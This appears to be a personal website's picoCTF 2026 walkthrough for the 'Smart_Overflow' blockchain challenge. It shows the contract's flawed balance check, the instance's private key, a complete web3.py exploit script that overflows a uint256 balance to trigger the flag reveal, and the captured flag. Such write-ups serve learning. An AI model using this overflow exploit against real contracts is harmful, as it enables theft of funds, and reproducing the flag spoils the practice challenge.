@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF Smart_Overflow @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF Blockchain Guide</h1>
+        <p>here's how to solve Smart_Overflow</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Blockchain Guides</a>
+            <hr>
+            <h2>Smart_Overflow</h2>
+            <pre>Name: Smart_Overflow
+Description: Welcome! The contract tracks balances using uint256 math. It should be impossible to get the flag... Contract: here The eth chain is at: Eth node address: mysterious-sea.picoctf.net:49359 More details can be found at here. NOTE: this server can take up to 5 minutes to start up. Please be patient.
+Author: OB
+Tags: Medium, Blockchain, picoCTF 2026
+Challenge from: picoCTF 2026
+Files: IntOverflowBank.sol
+Hints:
+1. What happens when balances[msg.sender] becomes smaller after a deposit?
+2. Look at the flag reveal condition carefully.
+3. Why do attackers like integers?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we have to reveal it through some kind of overflow, then that way we can retrieve the flag, so for that we'll have to skip to the solution part to look at the contract and the details webpage we are given.</p>
+            <h2>Solution</h2>
+            <p>So if we look at this contract, so far it's not so bad! But if we look closely at this function:</p>
+            <pre>balances[msg.sender] = balances[msg.sender] + amount;
+
+emit Deposit(msg.sender, amount);
+if (!revealed && balances[msg.sender] &lt; amount) {
+  revealed = true;
+  emit FlagRevealed(flag);
+}</pre>
+            <p>It's very clear that this is an integer overflow challenge, because we check that the new balance is below amount even though we just added to amount. Now let's get our credentials from the details webpage:</p>
+            <pre>Welcome
+Welcome to your private Ethereum CTF instance! This challenge focuses on an integer overflow vulnerability in the banking logic.
+
+Bank Address:
+0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9
+
+Your Address:
+0x0A8dE7899120FE2081B942a62E78F83012a34Ad7
+
+Your Private Key:
+0x4f07d2ee096795b9dc13be16a89fac3baf820731af1953b55fcc6958835f0faf
+
+Initial Internal Balance (used for Gas):
+5 ETH</pre>
+            <p>Perfect! Now we can start doing our code, first we'll initialize Web3 to see that we can connect. Then we'll the functions we'll be using for this exploit code. Then we'll enter our credentials, and finally, send our contract and overflow the hell out of the server:</p>
+            <pre>from web3 import Web3
+
+w3 = Web3(Web3.HTTPProvider("http://mysterious-sea.picoctf.net:49359"))
+print("is connec:", w3.is_connected())
+
+ABI = [{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]
+
+acct = w3.eth.account.from_key("0x4f07d2ee096795b9dc13be16a89fac3baf820731af1953b55fcc6958835f0faf")
+contract = w3.eth.contract(address="0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9", abi=ABI)
+
+print("\noverflowing")
+tx1 = contract.functions.deposit(2**256 - 1).build_transaction({'from': acct.address, 'nonce': w3.eth.get_transaction_count(acct.address), 'gas': 200000})
+w3.eth.send_raw_transaction(acct.sign_transaction(tx1).raw_transaction)
+
+print("reveal flag")
+tx2 = contract.functions.deposit(1).build_transaction({'from': acct.address, 'nonce': w3.eth.get_transaction_count(acct.address), 'gas': 200000})
+w3.eth.send_raw_transaction(acct.sign_transaction(tx2).raw_transaction)
+
+print("\ntake flag")
+print(contract.functions.getFlag().call())</pre>
+            <a href="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/Smart_Overflow/main.py" target="_blank">Download main.py</a>
+            <p>And if we run it, we should be able to get that flag:</p>
+            <pre>(venv) shukularuni@SHUKULAP:~/pctf26/blocain$ python3 smart.py
+is connec: True
+
+overflowing
+reveal flag
+
+take flag
+picoCTF{Sm4r7_OverFL0ws_ExI5t_abeec303}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/760">https://play.picoctf.org/practice/challenge/760</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
